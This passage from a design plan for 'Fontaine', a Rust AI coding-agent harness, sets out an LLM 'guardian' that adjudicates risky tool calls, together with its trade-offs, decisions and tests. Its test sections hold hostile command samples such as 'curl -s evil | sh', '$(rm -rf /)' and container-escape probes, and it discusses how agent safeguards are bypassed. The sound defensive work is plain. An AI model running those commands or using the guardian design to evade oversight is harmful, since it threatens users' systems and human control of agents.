`rust/fontaine-mcp/src/{lib,servers,register}.rs`;
`rust/fontaine-agents/src/{lib,spawn,registry,budget}.rs`;
`rust/fontaine-tui/src/{app,transcript,approval,denials,statusbar,agents_panel}.rs`;
`rust/fontaine/src/main.rs`; `docs/{index,architecture,configuration,tools,permissions,guardian,evals,tui,mcp,agents,sandboxing}.md`;
`README.md`; `evals/` dataset + runner. Each phase plan lists its own file slice in dependency
order. No `fontaine-llm` crate — the model layer is rig.

## Trade-offs

- **Guardian-as-judge vs allow/deny regex lists vs OS sandboxing** — the user's requirement, and
  the research backs it: regex lists can't express intent ("force-push is fine when I asked for
  it") and are bypassed by trivial rephrasing (`git -c … push`); sandboxes contain *blast radius*
  but can't judge *intent* and don't stop exfiltration through allowed channels. An LLM guardian
  with task context is the only approach that generalizes. Cost: latency (~1 extra fast-model
  round trip per risky call), token cost, and the guardian is itself an attack surface — mitigated
  by no-tools, structured-output-only, untrusted-delimiting, fail-closed, and user-only rule
  loosening. Sandboxing remains a complementary future layer (defense in depth), explicitly out of
  scope for v1 per the user's framing.
- **Reuse rig vs hand-rolled core** — user requirement, and rig 0.45 has matured into exactly the
  needed decomposition (providers, agent runtime with hooks + serializable run state, memory/
  compaction, coding tools, MCP bridge, record/replay, deterministic test utils). What we save:
  the entire provider/SSE/tool-delta layer (weeks of per-provider quirk work), session persistence,
  compaction, and base tool implementations. What we accept: rig is **pre-1.0 with breaking
  changes each release** — mitigated by exact-version pinning, a thin Fontaine-facing seam
  (`fontaine-core::models`, `GuardedTool`) that isolates rig types from the guardian/TUI, and
  deliberate upgrade windows. The alternative pattern (codex-rs/goose hand-roll everything) buys
  maximal control we don't need: our differentiator is the guardian, not the transport. Rejected
  middle grounds: `genai` (providers only — we'd still hand-build agent/memory/tools) and embedding
  `codex-core` (imports a competing approval/sandbox policy engine, not published as a library).
  Rejected for the TUI: rig's own Bevy-plugin harness (`rig-harness`/`rig-tui`) — adopting its
  plugin kernel would subordinate the guardian architecture to someone else's app shape; ratatui
  stays ours.
- **GuardedTool decorator vs rig AgentHook as the gate** — decorator is primary: it wraps every
  registered tool (built-ins and MCP alike), is unit-testable without a live agent, and doesn't
  depend on pre-1.0 hook semantics; hooks handle only bookkeeping. If rig's hooks later offer a
  guaranteed pre-execution veto with stable semantics, the decision can be revisited.
- **Stateless one-shot guardian requests vs persistent guardian conversation** — stateless chosen:
  no context poisoning over a long session, trivially cacheable and parallelizable, and each
  request carries a fresh digest of intent + session facts. Loses "guardian memory" of near-misses;
  recovered by passing `prior_denials` explicitly.
- **Read-only fast path (user-approved hybrid) + Tier 0.5 pre-classifier** — skips guardian latency on
  the highest-frequency calls (Claude Code does the same: dedicated Read/Grep/Glob tools and a
  built-in read-only Bash command set). The scope check (workspace containment, symlink resolution)
  and the pre-classifier (lexer + curated set membership + per-command read-only flag allowlist +
  the same scope validator) are
  deterministic code enforced by Fontaine at the execution boundary, not regex-on-args and not the
  tool's own declaration; a read that escapes scope, and any command the classifier cannot fully
  parse, goes to the guardian (read ≠ safe — out-of-workspace reads are recon/exfiltration risk),
  and MCP tools' self-declared `readOnlyHint` never qualifies for a fast path.
- **Parallel agents multiply guardian round-trips and model cost** — N subagents mean N× adjudications
  and token spend (Claude Code documents the same). Mitigated by Tier 0.5 (most read-ish subagent
  calls never reach the guardian), the local PromptGuard 2 result scanner (no per-result LLM call),
  and `[agents]` budget caps; the stateless per-request guardian parallelizes without shared state.
- **Composite guardian: tier latency/cost stacking vs screening-head economics** — a deeper tree could
  multiply round-trips per call. Mitigated by tier ordering (deterministic → decision-model screen →
  LLM adjudicator: each tier only sees what the cheaper one above could not resolve) and confidence-
  gated escalation — the measured Jev-Guard 4.80 s → 1.33 s review time is the counter-economics;
  scope discipline (benchmarked tiers only, roadmap-gated) keeps v1 at the deterministic+LLM spine.
- **Prose rule lists over Rego/OPA-style policy** — prose matches the guardian's medium (it is an
  LLM), is what Claude Code proved works, and stays editable by humans; a deterministic policy
  engine can't express "unless the user specifically asked for it".
- **Verdict via provider JSON-schema vs synthetic output tool** — rig's `structured_output` module
  implements the synthetic-output-tool pattern with required-field checks and retries, which works
  on every tool-capable model including local ones (the "any model I like" requirement applies to
  the guardian too). We reuse it instead of hand-rolling either path.

## Risk Gates (pre-committed kill criteria)

Abandon or pivot fontaine-the-harness (keeping fontaine-guardian-the-library) if any of the
following fires — transcribed from `analysis-strategic-verdict.md` ("Kill criteria"), which
carries the reasoning:

- OpenCode, Goose, or the claw-code lineage's active successors (LazyCodex / Gajae-Code) ship a
  first-party LLM-guardian permission backend **with published evals** before Fontaine's eval
  harness is public.
- A public red-team bypass of Fontaine's guardian cannot be closed within one release cycle
  (analysis-devils-advocate KILL #3 — mitigated by the eval-first sequencing already built into Phase 0/4).
- rig adopts a permission-adjudication API and refuses upstream collaboration (KILL #8 becomes
  fatal rather than convertible).
- Eval results show the best local guardian models cannot clear a credible bar (e.g. <60% catch
  on the seeded attack classes at <10% benign false-deny) — meaning the "any model" promise is
  hollow for the feature that matters.

## Decisions

- 2026-10-20: Hybrid gate — tool-declared `read_only` + workspace-scope check skips the guardian;
  everything else is adjudicated. (refined 2026-10-21 — containment enforcement, not the label,
  earns the fast path; see below) (User choice.)
- 2026-10-21: Hybrid-gate refinement — read/write is not a security classification: the fast path
  requires *Fontaine-enforced* workspace containment, not the tool's label. Read-only ≠ safe
  (out-of-scope reads are adjudicated/denied like writes), and third-party/MCP self-declared
  `readOnlyHint` never earns the fast path. (User choice.)
- 2026-10-20 (amended 2026-10-21: Phase 5 → Phase 1, see below): TUI-first (ratatui), headless
  `-p` mode in Phase 5 on the same core. (User choice.)
- 2026-10-20: Guardian is fail-closed on every non-verdict outcome (error, timeout, unparseable
  output, low confidence on destructive class). Adopted from Claude Code's documented behavior.
- 2026-10-20: Core is built on the rig crate family (rig-core/rig-agent/rig-memory/rig-tools/
  rig-rmcp/rig-cassette), pinned to exact versions; no custom provider layer. (User directive:
  reuse existing crates for the core wherever possible.)
- 2026-10-20: The guardian gate lives in the `GuardedTool` decorator (registry-level choke point),
  not in rig `AgentHook`s; hooks are for bookkeeping only.
- 2026-10-20: rig's Bevy-based harness/TUI (`rig-harness`, `rig-tui`) is not adopted; Fontaine
  keeps its own ratatui TUI.
- 2026-10-20 (superseded 2026-10-21 — dropped; the floors survive as the every-mode deterministic
  layer, see below): `bypass` mode was to be included in v1 behind an explicit opt-in flag with a
  loud warning, containers-only framing — parity with Claude Code's `bypassPermissions`
  **including its floor**: `[permissions] deny` rules and the never-auto-approved critical-path
  structural check (`rm` of filesystem root `/`, top-level dirs, home, cwd and its parents, `/etc`,
  `$HOME`, `.git`, dotfiles) still blocked even under bypass (reason then: Claude Code documents
  "deny rules block in every mode, including bypassPermissions"; keeping floors is the faithful
  parity — the floors stay, the mode goes).
- 2026-10-20 (superseded 2026-10-21; the same-gate rule survives, now in v1): No subagents in v1;
  when added (post-v1), subagent spawns/reports and
  `SendMessage`-style agent-to-agent calls go through the same guardian gate (Claude Code's
  classifier reviews agent-team messages the same way).
- 2026-10-20: License is Apache-2.0 — the repo's `LICENSE` is verbatim Apache-2.0 text; rule prose
  adapted from Anthropic's published documentation gets an attribution note in docs/guardian.md.
- 2026-10-21: "fontaine" is the final product name — binary, crate prefix, config dir
  `~/.config/fontaine`, `FONTAINE.md` convention. (User decision; resolves former Open Question 1.)
- 2026-10-21: guardian default = top-ranked model on Fontaine's benchmark-validated guardian list
  that is available on the configured provider; switching easy, explicit, never automatic; unset +
  no catalog match → main model with one-time notice. (User decision; resolves former Open
  Question 2.)
- 2026-10-21: default tool-result scanner = PromptGuard 2 (ONNX); cheap-LLM pass fallback;
  Llama 4 Community License gated-download caveat surfaced at first enable; BYO-scanner interface
  for license-clean setups. (User decision.)
- 2026-10-21: fold analysis-strategic-verdict amendments A3 (sandbox interop: srt/bubblewrap spike +
  `docs/sandboxing.md`, Phase 5 roadmap slot) and A4 (dependency-light, lift-out-able
  `fontaine-guardian` crate) into the roadmap. (User decision.)
- 2026-10-21: revisit core-vs-rig split if rig ships a permission-adjudication API (rig-harness
  contingency, analysis-strategic-verdict A4).
- 2026-10-21: design tie-breaker — when in doubt, do as Claude Code does: at analogous design
  points (permission modes, fail-closed behavior, escalation UX, config trust asymmetry, read-only
  skipping, deny-with-explanation) Fontaine copies Claude Code's documented semantics; any
  deviation gets a dated line in Decisions with a one-line reason. (User directive.)
- 2026-10-21: composite tools + Tier 0.5 — dedicated first-party read tools (`ls`/`read`/
  `glob`/`grep`) plus a deterministic, zero-LLM shell pre-classifier (structural: shlex/AST lexing
  + curated read-only set membership + per-command read-only flag allowlist + the step-4 scope
  validator; never regex-on-args; fail-through on anything unparsed) as a guardian-skipping fast path; curated set ships conservative,
  user-extensible via the `[shell_preclassifier] allow_extra` key — one mode-agnostic list
  applying in every mode (no per-mode keys: the pre-classifier runs before the mode branches),
  user-scope only; not the guardian's `[auto_mode].allow` prose list — never auto-extended. Mirrors
  Claude Code's read-tool split + built-in read-only Bash command set per the tie-breaker.
  Deviations from Claude Code, recorded per that guideline: we reject unquoted globs in
  pre-classified commands (Claude Code permits them for read-only commands — reason: the glob
  could expand to an out-of-scope path or a write-capable flag, and shell-side expansion is
  invisible to the scope validator); and "don't ask again" style grants never auto-extend the
  curated set — they land only as explicit user-scope config rules (reason: a checked-in repo or
  an injected session must not accumulate loosened prefixes; auto-extension is loosening).
  (User directive 2.)
- 2026-10-21 (supersedes 2026-10-20 "no subagents in v1"): parallel multi-agent management is a
  v1 requirement, Claude Code-style (`fontaine-agents`; spawn/list/stream/interrupt, per-agent
  context + model + restricted toolset, budgets); agent-to-agent messages go through the same
  guardian gate — the 2026-10-20 line stands, now in v1. (User directive 3.)
- 2026-10-21: deliberate Claude-Code deviation — child mode is never looser than parent's (≤
  parent); Claude Code lets default/dontAsk/plan parents set child permissionMode including auto;
  Fontaine hardens it because a child's effective authority must never exceed what the human
  granted the session. Mechanism (redesign 2026-10-21 — fixes two-dimensionality: plan's guardian
  leg was looser than manual on unattended calls, so no total order existed): `[agents.types]`
  `mode` key, default `"inherit"`; an explicit per-type `mode` may only be `manual` or `dontAsk`
  (tighten-to-interactive-only); session ladder `dontAsk < manual < acceptEdits < auto` (`plan`
  removed — a session-root interactive posture, not a child mode); `plan`/`acceptEdits`/`auto`
  reachable for a child only via `inherit` from a parent already there.
- 2026-10-21: deliberate Claude-Code deviation — `acceptEdits` auto-approves Fontaine's edit-class
  tools only; Claude Code's acceptEdits also auto-approves in-scope filesystem Bash (`mkdir`,
  `touch`, `rm`, `rmdir`, `mv`, `cp`, `sed`), while Fontaine keeps those `Arbitrary`-class shell
  calls behind a prompt (stricter than Claude Code; reason: writes ride the classified edit tools,
  the pre-classifier set is read-only, and a mutating shell must not fast-path).
- 2026-10-21: subagent nesting mirrors Claude Code's documented rules (per the tie-breaker — not a
  deviation): default depth cap of three layers below the main conversation, at which the `agent`
  tool is withheld from subagents; `[agents] max_parallel` bounds concurrent agents across the
  whole session tree; the per-subagent token/cost cap always binds, and the root session total
  (`[agents] session_token_budget` / `session_cost_budget_usd`, default unset) binds when set —
  every agent in the tree debits it; hitting a binding cap stops the subagent with a partial
  result and its pending prompts cancelled as denied. Unset, tree exposure is structurally
  bounded by max_parallel (tree-wide) × per-subagent caps × the 3-layer depth cap.
- 2026-10-21: plan mode follows Claude Code's default (classifier reviews consequential non-edit
  calls; `useAutoModeDuringPlan` is on by default) — edits structurally blocked regardless of
  verdict.
- 2026-10-21: deterministic `[permissions] deny` rules and the critical-path structural check
  gate every mode — never-auto-approved destructive ops are structurally blocked, matching Claude
  Code's critical-path list (filesystem root `/`, top-level dirs, home, cwd and its parents,
  `/etc`, `$HOME`, `.git`, dotfiles) — independent of any bypass mode (structured tool/path
  matching, not arg regex). Floor order: deny → ask → critical-path.
- 2026-10-21: deliberate Claude-Code deviation — config trust asymmetry is looser than Claude
  Code on the deny side: CC ignores the whole `autoMode` block from project settings (no denies
  from checked-in files); Fontaine lets a project repo at least add deny-side rules (reason:
  deny-only additions can only tighten — never allow or mode changes; `ask` rules count as
  deny-side additions and may likewise be added project-wide).
- 2026-10-21 (user): bypass/permissions-prompt-bypass not shipped at all in v1 — deviation from
  Claude Code's bypassPermissions; eval/CI baselines always run WITH the guardian; the
  deterministic deny/ask/critical-path layer gates every mode.
- 2026-10-21: shipped default mode = auto (Claude Code parity, v2.1.283+ built-in starting mode);
  interim default = manual until the guardian wires in at Phase 4 — no auto without a guardian.
- 2026-10-21 (user): headless -p promoted to Phase 1 — CI integration tests and the eval harness
  drive core headlessly from day one; TUI-first unchanged as interactive posture.
- 2026-10-21: deliberate Claude-Code deviation — subagent reports screened by the optional
  (default-off) result scanner, not by the classifier at handoff as Claude Code does — deviation
  recorded; the guardian's no-tool-output rule is why.
- 2026-10-21 (user): no zero-guardian mode exists — containers get `[guardian] profile="minimal"`,
  never off; minimal = containment-integrity ruleset (the escape classes enumerated in Minimal
  guardian profile: mount/umount, docker-socket access, /proc/sys + cgroup control writes,
  privileged namespace ops, raw device access, bind-mount host writes via symlink traversal,
  sandbox-proxy bypass) + the deterministic floors; exfiltration-class remote writes still
  adjudicate; requires Fontaine-verified containment (srt/bubblewrap launch or user-scope
  `--in-container` + runtime probe; probe failure ⇒ fall back to `full`); user-scope only; ships
  with its own scorecard column.
- 2026-10-21 (user): Jev + open alternatives (Laya, DiffusionGemma) enter the benchmark-validated
  guardian list as CANDIDATES (screening tier + standalone evaluation); hosted-Jev never the local
  default; thresholds always recalibrated on Fontaine's golden set (vendor defaults over-escalate —
  measured: 17/21 wrong escalations at the shipped 0.85/0.6 defaults).
- 2026-10-21 (user): guardian tree accepted as design direction — strictest-wins composition,
  fail-closed between tiers, per-domain policy subtrees (Jev-Guard precedent), benchmarked tiers
  only; v1 ships the deterministic+LLM spine, screen tier + subtree specialization are roadmap
  (Phase 6+); one tree serves the whole session agent tree (no per-subagent guardians).
- 2026-10-21 (user): the plan is split into this master tracking task + one plan per phase under
  `tasks/phases/` (a Phase 0–6 numbering; each phase plan ends with a docs step — documentation
  is a per-phase deliverable, all of it under `docs/`, the website-ready home for product prose).
  (User directive.)

## Documentation

All product documentation lives under `docs/` — a standalone directory, one topic per page,
relative cross-links, current behavior only (no plan/phase citations in the docs themselves).
The tree is kept **website-ready**: lifting `docs/` into a static site is a likely future step,
explicitly **not urgent** — no site tooling ships in v1, and the only forward constraint is the
file layout above. Root `README.md` is the thin front door (pitch, install, quickstart, mode
table, auto-mode explainer) that links into `docs/`, not a second copy of it. Each page is
delivered (or extended) by the docs step of the phase named with it — see the phase plans.

- `docs/index.md`: landing page / TOC (Phase 0).
- `docs/architecture.md`: workspace map, agent-loop and permission-pipeline diagrams, surfaces
  (TUI + headless), session persistence (skeleton Phase 0; grown in Phases 1, 3, 5).
- `docs/configuration.md`: every config key, trust asymmetry of project vs user settings,
  provider setup examples — seeded from the §Config schema (Phase 0); grown in Phases 1, 3, 4,
  5, 6 as each `[section]` ships.
- `docs/tools.md`: built-in tool inventory, risk classes, the containment fast path, shell
  hardening (Phase 2).
- `docs/permissions.md`: mode table, deterministic floor, Tier-0.5 pre-classifier, `auto` and the
  `[auto_mode]` prose lists (Phases 3–4).
- `docs/guardian.md`: threat model, request/verdict schema, rule precedence, prompt-versioning
  policy, how to choose a guardian model, known limits (latency, injection surface, eval results),
  result scanning, and attribution of Anthropic-derived rule prose (and MIT-licensed
  LlamaFirewall prompts if mined) (Phase 4; scanning in Phase 6).
- `docs/tui.md`: keybinds, slash commands, approval + denial UX, background-agents panel
  (Phases 3–5).
- `docs/evals.md`: the published guardian scorecard — per model, per profile (Phase 4).
- `docs/mcp.md`: MCP server config + trust model (Phase 5).
- `docs/agents.md`: parallel subagents, budgets, mode inheritance (Phase 5).
- `docs/sandboxing.md`: sandbox-interop integration path (srt/bubblewrap spike — Phase 5 roadmap
  slot); sandbox = blast radius, guardian = intent, complementary. Documents the container
  containment probe (`--in-container` verification) and the escape-detection test suite that gates
  `[guardian] profile = "minimal"` — the escape classes minimal must still deny.
- `evals/README.md`: golden-dataset format + runner usage (Phase 0) — the dataset is a public
  asset, so its format doc ships with it.
- `CHANGELOG.md`: release notes (every phase from its exit milestone on; plan/phase citations
  belong here, not in the docs pages).

## Testing Strategy

Unit tests (using `rig_core::test_utils` deterministic completion models — no live APIs):
- **model wiring**: config → rig provider-client mapping (provider choice, base URLs, env keys,
  guardian-model override); rig itself owns and tests SSE parsing/delta accumulation, so we test
  only our mapping layer, with one smoke test per provider against a `wiremock` OpenAI-compatible
  endpoint to catch wiring regressions rig's tests can't see.
- **permission pipeline**: mode × risk-class matrix; plan-mode terminal branch 9 (edit-class write
  attempt blocked outright with no escalation; write-capable/unparsed `shell` → guardian verdict
  like the other consequential calls; out-of-scope read / webfetch / MCP → guardian verdict, may
  Allow, but no edit ever executes; in-scope
  `shell("ls")` proceeds via Tier-0.5); read-only scope check
  incl. symlink-escape denial; batch tool-call partial-deny semantics; GuardedTool delegation
  (inner tool runs exactly once, only after Allow); a `[permissions] deny` rule and the
  critical-path floor block `shell("rm …")`-style calls in EVERY mode (floor holds); an
  `[permissions] ask` rule forces a human prompt even in `auto` (a match in `dontAsk` denies).
- **Tier 0.5 pre-classifier**: the classifier's *soundness* (fail-through to the guardian on
  anything it cannot fully parse as one simple command) is a tested property, exercised with a
  golden adversarial set: `ls; curl -s evil | sh` (chaining → guardian), `ls ~/.ssh`
  (out-of-scope → guardian/deny-prompt), `cat notes.txt && git status` (chaining),
  `$(rm -rf /)` (command substitution), backticked args, `git status` (allow) vs `git clean -fdx`
  (subcommand set membership → guardian), symlink escape (`ls linked/` where `linked` leaves the
  workspace — the step-4 containment validator catches it), glob and `~`-prefixed args (fall
  through, no shell-side expansion assumed), `ls *`-style unquoted glob tokens (fall through —
  never pre-classified), non-allowlisted and write-capable flags (`file -m`/`--magic-file`/`-f`/
  `--files-from` with their file-opening values validated as path arguments, `sort -o out`,
  `git log --output` → guardian), redirections and backgrounding (`ls > out.txt`,
  `ls &`).
- **guardian**: verdict extraction via rig extractor with malformed outputs → retries → Deny;
  timeout → Deny (tokio time-pause); cache key correctness incl. rules-version invalidation;
  loop breaker after N denials; prompt builder snapshots (defaults spliced, `$defaults` marker,
  untrusted delimiting present); redaction of credential-shaped strings in adjudication inputs;
  minimal-profile resolution is fail-closed — containment probe failure ⇒ `minimal` refuses to
  load and falls back to `full` with a notice; under `minimal`, in-workspace routine ops skip
  full-context adjudication but escape primitives (mount, docker.sock write, cgroup control
  write, proxy bypass) and exfiltration-class remote writes still Deny/Escalate.
- **tools**: workspace-scope validator (path traversal, absolute paths, symlinks); shell
  hardening wrapper (timeout, output cap); risk-class registration of every built-in and MCP tool
  (a test that fails if any registered tool is missing a risk class — the choke point stays closed).
- **config**: precedence, project-can-only-tighten enforcement — including that `[guardian] profile`
  is rejected from project scope (user-scope only, it is a loosening knob) and only `full`/`minimal`
  validate: no config value disables the guardian.
- **parallel agents**: spawn-call gating (task × toolset × model composite); mode inheritance
  invariant (child effective mode ≤ parent, never looser); per-type registry is a subset of the
  parent's; budget caps stop a subagent; subagent results pass the tool-result scanner path;
  `SendMessage`-style peer messages hit the same gate.

Integration — driven through the headless `-p` surface (Phase 1, step 2): full agent runs are
recorded and replayed with `rig-cassette` — record a real session once
(prompt → stream → tool call → guardian verdict → execute → result → answer), replay it
deterministically in CI; plus a fail-closed test where the guardian endpoint 500s (wiremock) and
the tool call is denied. Cassette replay is what makes the end-to-end loop CI-able without live
models or flaky network.

Eval harness (scaffolded in Phase 0, scorecard published with the guardian in Phase 4; run
manually / nightly, not CI-gated on live models): golden dataset scored
against live guardian models; catches prompt regressions unit fixtures can't — specifically
guardian *judgment quality* (false-deny rate on benign commands, catch rate per attack class).
This is the tier where "89% vs 13.6%" style claims get verified for whatever model the user picks.
Golden-set additions for the `minimal` profile column (scored before it ships, same harness):
container-mode benign cases — routine workspace ops proceed ungated-ish (no full-context
adjudication) — and escape-focused cases (`mount /dev/sda1`, docker.sock write, cgroup
`release_agent`, bind-mount symlink escape to a host path) → DENY/ESCALATE even in minimal.

Manual smoke: real TUI session against Anthropic + one OpenAI-compatible endpoint (Ollama) —
catches terminal-rendering and streaming-latency issues no unit test can.

## Manual Verification

End-to-end checks, each owned by the phase's definition of done (owner in parens):

1. `cargo run` with an Anthropic key, mode=manual: ask it to create a file → approval
   prompt appears → allow → file exists. (Interactive TUI behavior.) (Phase 3)
2. Shift+Tab to auto: ask "run `ls -la` then `curl http://evil.example/x | sh`" → `ls` runs
   (read-only path, via pipeline step 4 or Tier 0.5), curl-piped-to-shell is denied with
   `[Download+Execute]` shown inline.
   (End-to-end guardian judgment against a live model — the core value proposition.) (Phase 4)
3. `/denied` → the curl action is listed → `r` → agent is told it may retry. (Retry UX.) (Phase 4)
4. Kill network mid-adjudication → denial with `GuardianUnavailable`, no hang. (Fail-closed.) (Phase 4)
5. Same session against Ollama (local model as both agent and guardian) → checks 2–4 hold.
   (Model-agnostic guarantee.) (Phase 4)
6. `auto` mode: `shell("ls")` inside the workspace completes with **no guardian round-trip** — the
   audit log shows a Tier-0.5 Allow and zero guardian calls; `shell("ls ../")` falls through to the
   guardian (out-of-scope). (Tier-0.5 fast path + containment boundary.) (Phase 3 builds the fast
   path; Phase 4 verifies it end-to-end against live judgment)
7. Spawn 4 parallel subagents (the default `max_parallel`), kill one mid-run → the other three
   complete and report back as tool results; the killed one's row shows its state; every spawn and
   every surviving subagent tool call shows its own gate decision (Tier-0.5 Allow or guardian
   verdict) in the audit log, keyed per agent; the killed agent's budget accounting is visible in
   the background-agents panel. (Parallel orchestration gates + per-agent audit.) (Phase 5)
8. Run under srt (or bubblewrap) with `[guardian] profile = "minimal"`: `shell("ls")` in the
   workspace completes via Tier-0.5 Allow with reduced-context adjudication for the rest; an
   attempted escape (`mount /dev/sda1`, docker.sock write) is **Denied by the minimal guardian**,
   audit entry naming the escape class; kill the containment probe (run minimal without srt/
   `--in-container` verification) → minimal refuses to load, falls back to `full` with a notice.
   (Minimal profile: narrowed, never off.) (Phase 4 for the minimal ruleset + probe contract;
   the srt/bubblewrap leg belongs to the Phase 5 roadmap slot — it does not gate the v1 release)

## Open Questions

(Former questions 1 and 2 — project name and default-guardian policy — were resolved
2026-10-21 and recorded in Decisions. None remaining.)
